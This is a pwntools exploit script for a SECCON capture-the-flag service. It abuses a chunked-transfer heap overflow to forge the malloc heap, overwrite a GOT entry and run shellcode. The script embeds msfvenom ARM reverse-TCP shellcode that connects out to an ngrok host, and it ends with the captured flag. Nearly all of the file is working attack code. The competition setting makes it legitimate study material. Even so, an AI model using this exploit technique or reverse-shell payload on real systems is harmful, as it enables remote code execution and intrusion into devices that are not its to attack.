#!/usr/bin/env python2
# pylint: skip-file
"""
When performing a chunked transfer, realloc doesnt take into account the size of the headers allowing an overflow.
As the initial heap (0x100) is located inline we can overwrite the current heap location.
* overwrite __malloc_heap to point to our fake heap
* our fake heap size is huge so that memory os returned near the GOT
* overwrite memchr got with shellcode address
* win
"""
from pwn import *

def exploit():
  
  # send a request to get the heap adress
  p.send("G / H\n\n\n")
  p.recvuntil("hello world")

  if len(sys.argv) > 1:
    r.recvuntil("recv: 00004 (0x")
    offset = int(r.recvuntil(")", drop=True), 16)
  else:
    offset = int(raw_input(), 0)
    
  # address of fake __malloc_heap+4
  offset += 0x100
  payload = "\x00" + p32(0) + p32(offset) + p32(offset - 0x11D00)
  payload = payload.ljust(0x30, "\x00")

  
  # start a chunked transfer
  p.send("P /echo H\nTransfer-Encoding:chunked\nA:{}\n\n".format("A"*8))
  sleep(1)
  
  # overwrite __malloc_heap with fake one
  # fake size will cause malloc to return binary got
  p.send("{}\n{}\n".format(hex(len(payload))[2:], payload))
  sleep(1)

  # overwrite memchr with payload addrds
  # section is rwx
  payload2 = cyclic(136)
  payload2 += p32(0x00011e04)

  # add reverse tcp shell for armv6
  payload2 += asm(shellcraft.nop()*0x10)
  payload2 += buf

  p.send(payload2)
  p.interactive()

  """
  Connection from 127.0.0.1:59116
  cat /flag.txt
  SECCON{5ea4f1ee2820cf8d6151937236f8f69e}
  """

if __name__ == "__main__":
  context.terminal=["tmux", "sp", "-h"]

  context.arch = "arm"
  context.os = "linux"


  # msfvenom --arch armle --payload linux/armle/shell_reverse_tcp --format py --platform linux LHOST=0.tcp.ngrok.io LPORT=14612

  buf =  ""
  buf += "\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c"
  buf += "\x70\xa0\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60"
  buf += "\xa0\xe1\x60\x10\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0"
  buf += "\xe3\x8e\x70\x87\xe2\x00\x00\x00\xef\x06\x00\xa0\xe1"
  buf += "\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x06"
  buf += "\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00"
  buf += "\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0"
  buf += "\xe3\x00\x00\x00\xef\x24\x00\x8f\xe2\x04\x40\x24\xe0"
  buf += "\x10\x00\x2d\xe9\x0d\x20\xa0\xe1\x24\x40\x8f\xe2\x10"
  buf += "\x00\x2d\xe9\x0d\x10\xa0\xe1\x0b\x70\xa0\xe3\x00\x00"
  buf += "\x00\xef\x02\x00\x39\x14\x34\x0f\xb7\x95\x2f\x62\x69"
  buf += "\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  buf += "\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  buf += "\x00\x00\x00"

  if len(sys.argv) > 1:
    r = remote("internet-of-seat.pwn.seccon.jp", 1337)
    r.sendlineafter(">>", "0")
    r.recvuntil("Your port: ", drop=True)
    port = int(r.recvline(keepends=False))
    r.recvuntil("8888...")
    p = remote("internet-of-seat.pwn.seccon.jp", port)
  else:
    p = remote("localhost", 8888)

  exploit()
